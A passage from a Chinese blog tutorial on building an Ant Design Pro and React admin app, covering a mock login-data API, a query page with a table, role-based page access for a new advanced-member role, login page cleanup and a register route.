class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Request</span>, <span class="title class_">Response</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> logindata = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;createtime&quot;</span>: <span class="string">&quot;2024-04-16 05:19:34&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;url&quot;</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;createtime&quot;</span>: <span class="string">&quot;2024-04-16 07:14:25&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getLoginData</span> = <span class="keyword">async</span> (<span class="params">req: Request, res: Response</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">5000</span>)); <span class="comment">// 模拟异步请求延迟</span></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">data</span>: logindata &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="string">&#x27;GET /api/logindata&#x27;</span>: getLoginData,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>访问 <code>http://localhost:8000/api/logindata</code> ，加载5秒后可以查看返回的模拟数据</p><h2 id="创建api函数"><a class="markdownIt-Anchor" href="#创建api函数"></a> 创建API函数</h2><p>创建 <code>src\services\ant-design-pro\logindata.ts</code> ，</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">&#x27;@umijs/max&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 查询登录数据 GET /api/logindata */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">queryLoginData</span>(<span class="params"></span></span><br><span class="line"><span class="params">  params: &#123; </span></span><br><span class="line"><span class="params">    username?: <span class="built_in">string</span>; </span></span><br><span class="line"><span class="params">    url?: <span class="built_in">string</span>;</span></span><br><span class="line"><span class="params">  &#125;,</span></span><br><span class="line"><span class="params">  options?: &#123; [key: <span class="built_in">string</span>]: <span class="built_in">any</span> &#125;,</span></span><br><span class="line"><span class="params">  </span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> request&lt;<span class="variable constant_">API</span>.<span class="property">LogindataList</span>&gt;(<span class="string">&#x27;/api/logindata&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;</span><br><span class="line">      ...params,</span><br><span class="line">    &#125;,</span><br><span class="line">    ...(options || &#123;&#125;),</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 <code>API.LogindataList</code> 是事先定义好的返回数据类型，写在 <code>src\services\ant-design-pro\typings.d.ts</code> 中</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">LogindataListItem</span> = &#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">username</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">password</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">createtime</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LogindataList</span> = &#123;</span><br><span class="line">  data?: <span class="title class_">RuleListItem</span>[];</span><br><span class="line">  <span class="comment">/** 列表的内容总数 */</span></span><br><span class="line">  total?: <span class="built_in">number</span>;</span><br><span class="line">  success?: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="编写组件函数"><a class="markdownIt-Anchor" href="#编写组件函数"></a> 编写组件函数</h2><p>创建 <code>src\pages\Search\index.tsx</code>，来写一个查询+展示的页面</p><p>结合按钮、输入框和表格组件，编写主组件对查询到的数据进行渲染</p><blockquote><p>笔者也是初学react，所以对react的语法并不熟悉，而为了快速完成开发，我主要结合GPT来写代码。可以将 <a href="https://ant.design/components/overview-cn">ant design组件库</a> 中你想要使用的组件代码喂给gpt，让他为你生成主组件代码并实现你自己的一些业务需求。注意可以一步步去添加实现功能，慢慢让gpt完善，一次性提太多复杂的功能会影响代码的质量</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//查询页面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; queryLoginData &#125; <span class="keyword">from</span> <span class="string">&#x27;@/services/ant-design-pro/logindata&#x27;</span>;</span><br><span class="line"><span class="comment">// 使用 Ant Design 的按钮、表格组件</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Input</span>, <span class="title class_">Button</span>, <span class="title class_">Table</span>, <span class="title class_">Space</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span>; </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">TableColumnsType</span>, <span class="title class_">TableProps</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;antd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">DataType</span> &#123;</span><br><span class="line">    <span class="attr">key</span>: <span class="title class_">React</span>.<span class="property">Key</span>;</span><br><span class="line">    <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">username</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">password</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">createtime</span>: <span class="built_in">string</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义表格列</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">columns</span>: <span class="title class_">TableColumnsType</span>&lt;<span class="title class_">DataType</span>&gt; = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;URL&#x27;</span>,</span><br><span class="line">      <span class="attr">dataIndex</span>: <span class="string">&#x27;url&#x27;</span>,</span><br><span class="line">      <span class="attr">key</span>: <span class="string">&#x27;url&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;Username&#x27;</span>,</span><br><span class="line">      <span class="attr">dataIndex</span>: <span class="string">&#x27;username&#x27;</span>,</span><br><span class="line">      <span class="attr">key</span>: <span class="string">&#x27;username&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;Password&#x27;</span>,</span><br><span class="line">      <span class="attr">dataIndex</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">      <span class="attr">key</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;Create Time&#x27;</span>,</span><br><span class="line">      <span class="attr">dataIndex</span>: <span class="string">&#x27;createtime&#x27;</span>,</span><br><span class="line">      <span class="attr">key</span>: <span class="string">&#x27;createtime&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义主组件LoginDataQuery</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">LoginDataQuery</span>: <span class="title class_">React</span>.<span class="property">FC</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 定义状态变更函数</span></span><br><span class="line">  <span class="keyword">const</span> [data, setData] = useState&lt;<span class="title class_">DataType</span>[]&gt;([]);</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState&lt;<span class="built_in">boolean</span>&gt;(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> [url, setUrl] = useState&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> [username, setUsername] = useState&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// logindata表 查询函数</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">fetchFilteredLoginData</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setLoading</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">queryLoginData</span>(&#123; url, username &#125;);</span><br><span class="line">      <span class="keyword">if</span> (response.<span class="property">data</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> formattedData = response.<span class="property">data</span>.<span class="title function_">map</span>(<span class="function">(<span class="params">item, index</span>) =&gt;</span> (&#123;</span><br><span class="line">          <span class="attr">key</span>: index,</span><br><span class="line">          <span class="attr">url</span>: item.<span class="property">url</span>,</span><br><span class="line">          <span class="attr">username</span>: item.<span class="property">username</span>,</span><br><span class="line">          <span class="attr">password</span>: item.<span class="property">password</span>,</span><br><span class="line">          <span class="attr">createtime</span>: item.<span class="property">createtime</span>,</span><br><span class="line">        &#125;));</span><br><span class="line">        <span class="title function_">setData</span>(formattedData);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;No data returned from API&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;获取登录数据失败&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">setLoading</span>(<span class="literal">false</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 渲染</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Space</span> <span class="attr">direction</span>=<span class="string">&quot;horizontal&quot;</span> <span class="attr">size</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">marginBottom:</span> <span class="attr">16</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>输入URL：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Input</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">&quot;Enter URL&quot;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">value</span>=<span class="string">&#123;url&#125;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">onChange</span>=<span class="string">&#123;e</span> =&gt;</span> setUrl(e.target.value)&#125; </span></span><br><span class="line"><span class="language-xml">            style=&#123;&#123; width: 200 &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">label</span>&gt;</span>输入Username：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Input</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">placeholder</span>=<span class="string">&quot;Enter Username&quot;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">value</span>=<span class="string">&#123;username&#125;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            <span class="attr">onChange</span>=<span class="string">&#123;e</span> =&gt;</span> setUsername(e.target.value)&#125; </span></span><br><span class="line"><span class="language-xml">            style=&#123;&#123; width: 200 &#125;&#125;</span></span><br><span class="line"><span class="language-xml">          /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">onClick</span>=<span class="string">&#123;fetchFilteredLoginData&#125;</span> <span class="attr">loading</span>=<span class="string">&#123;loading&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          查询</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Space</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Table</span> <span class="attr">columns</span>=<span class="string">&#123;columns&#125;</span> <span class="attr">dataSource</span>=<span class="string">&#123;data&#125;</span> <span class="attr">loading</span>=<span class="string">&#123;loading&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">LoginDataQuery</span>;</span><br></pre></td></tr></table></figure><h2 id="权限控制"><a class="markdownIt-Anchor" href="#权限控制"></a> 权限控制</h2><p>ant design pro默认设置了user和admin两个用户类型，user可以范围跟所有的页面除了用户管理界面（仅admin可以访问）</p><p>需求：用户分为3种，包括管理员、普通会员、高级会员</p><ul><li><p>普通用户：只拥有部分查询页面权限</p></li><li><p>高级会员：拥有所有查询功能</p></li><li><p>管理员：拥有完整后台权限包含所有查询功能，会员管理功能</p></li></ul><p>这样看的话我们只需要再添加一个高级会员类型的用户</p><p>首先在 <code>mock\user.ts</code> 中的登录API函数 <code>POST /api/login/account</code> 中添加</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高级用户权限</span></span><br><span class="line"><span class="keyword">if</span> (password === <span class="string">&#x27;ant.design&#x27;</span> &amp;&amp; username === <span class="string">&#x27;advancedUser&#x27;</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(&#123;</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">    <span class="keyword">type</span>,</span><br><span class="line">    <span class="attr">currentAuthority</span>: <span class="string">&#x27;advancedUser&#x27;</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  access = <span class="string">&#x27;advancedUser&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>src\access.ts</code> 文件中，定义权限 canAdvancedUser</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">access</span>(<span class="params">initialState: &#123; currentUser?: API.CurrentUser &#125; | <span class="literal">undefined</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; currentUser &#125; = initialState ?? &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">canAdmin</span>: currentUser &amp;&amp; currentUser.<span class="property">access</span> === <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="comment">// 高级会员权限：可以访问下载功能，管理员也可以使用</span></span><br><span class="line">    <span class="attr">canAdvancedUser</span>: currentUser &amp;&amp; (currentUser.<span class="property">access</span> === <span class="string">&#x27;advancedUser&#x27;</span> || currentUser.<span class="property">access</span> === <span class="string">&#x27;admin&#x27;</span>),</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <code>config\routes.ts</code> 中，设置仅advancedUser可以访问的页面</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 高级会员和管理员可访问，进行需求2的操作</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;下载&#x27;</span>,</span><br><span class="line">  <span class="attr">icon</span>: <span class="string">&#x27;DownloadOutlined&#x27;</span>,</span><br><span class="line">  <span class="attr">access</span>: <span class="string">&#x27;canAdvancedUser&#x27;</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/download&#x27;</span>,</span><br><span class="line">  <span class="attr">component</span>: <span class="string">&#x27;./Download&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们只需要设置页面权限，不需要设置页面内部分内容的权限，这里就已经完成了。</p><h2 id="登录页面修改"><a class="markdownIt-Anchor" href="#登录页面修改"></a> 登录页面修改</h2><p>默认的登录页面如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240725150834228.png" alt="image-20240725150834228" /></p><p><strong>需求</strong>：仅需要账号密码登录，添加注册功能，删除掉其他登陆方式，再修改一下UI</p><p>这一部分主要参考 <a href="https://juejin.cn/post/7208188347864465445">react+antdpro+ts实现企业级前端项目三：实现系统登陆</a> 文章进行修改</p><h3 id="删除其他登录方式"><a class="markdownIt-Anchor" href="#删除其他登录方式"></a> 删除其他登录方式</h3><p>打开 <code>src\pages\User\Login\index.tsx</code> 文件，找到下面两块代码，注释掉：</p><ul><li>ActionIcons 组件，定义了登录页面底部的其他登录方式图标，使用了 <code>AlipayCircleOutlined</code>、<code>TaobaoCircleOutlined</code> 和 <code>WeiboCircleOutlined</code> 三个图标。</li></ul><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ActionIcons 组件</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ActionIcons</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; styles &#125; = <span class="title function_">useStyles</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">AlipayCircleOutlined</span> <span class="attr">key</span>=<span class="string">&quot;AlipayCircleOutlined&quot;</span> <span class="attr">className</span>=<span class="string">&#123;styles.action&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">TaobaoCircleOutlined</span> <span class="attr">key</span>=<span class="string">&quot;TaobaoCircleOutlined&quot;</span> <span class="attr">className</span>=<span class="string">&#123;styles.action&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">WeiboCircleOutlined</span> <span class="attr">key</span>=<span class="string">&quot;WeiboCircleOutlined&quot;</span> <span class="attr">className</span>=<span class="string">&#123;styles.action&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用ActionIcons 组件</span></span><br><span class="line">          actions=&#123;[</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">FormattedMessage</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">key</span>=<span class="string">&quot;loginWith&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">id</span>=<span class="string">&quot;pages.login.loginWith&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">              <span class="attr">defaultMessage</span>=<span class="string">&quot;其他登录方式&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">            /&gt;</span></span>,</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">ActionIcons</span> <span class="attr">key</span>=<span class="string">&quot;icons&quot;</span> /&gt;</span></span>,</span><br><span class="line">          ]&#125;</span><br></pre></td></tr></table></figure><h3 id="删除掉手机号注册"><a class="markdownIt-Anchor" href="#删除掉手机号注册"></a> 删除掉手机号注册</h3><p>直接参考上面的文章进行注释</p><h3 id="字样修改"><a class="markdownIt-Anchor" href="#字样修改"></a> 字样修改</h3><p><code>src\components\Footer\index.tsx</code> 中修改底边栏</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240725152020901.png" alt="image-20240725152020901" /></p><p>找到标题和副标题，修改主标题，对副标题进行注释</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="string">&quot;Ant Design&quot;</span></span><br><span class="line">subTitle=&#123;intl.<span class="title function_">formatMessage</span>(&#123; <span class="attr">id</span>: <span class="string">&#x27;pages.layouts.userLayout.title&#x27;</span> &#125;)&#125;</span><br></pre></td></tr></table></figure><p>如果想要换成其他副标题的话可以直接：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subTitle=<span class="string">&#x27;基于React+ant design Pro +Ts的企业级应用&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="添加注册页面"><a class="markdownIt-Anchor" href="#添加注册页面"></a> 添加注册页面</h2><p>需求：前端存在对字段的各种验证机制</p><p>最终页面显示如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240725170206028.png" alt="image-20240725170206028" /></p><p>在pages/User下创建Register文件夹并创建index.tsx文件</p><p>然后在config/routes创建register注册路由。</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/user&#x27;</span>,</span><br><span class="line">  <span class="attr">layout</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    <span class="comment">// 登录</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/user/login&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="string">&#x27;./User/Login&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 注册</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;register&#x27;</span>, </span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/user/register&#x27;</span>, </span><br><span class="line">      <span class="attr">component</span>: <span class="string">&#x27;./User/Register&#x27;</span>&#125;</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>去 <code>mock\user.ts</code> 文件下添加处理注册请求的mock</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册</span></span><br><span class="line"><span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (<span class="attr">req</span>: <span class="title class_">Request</span>, <span class="attr">res</span>: <span class="title class_">Response</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span 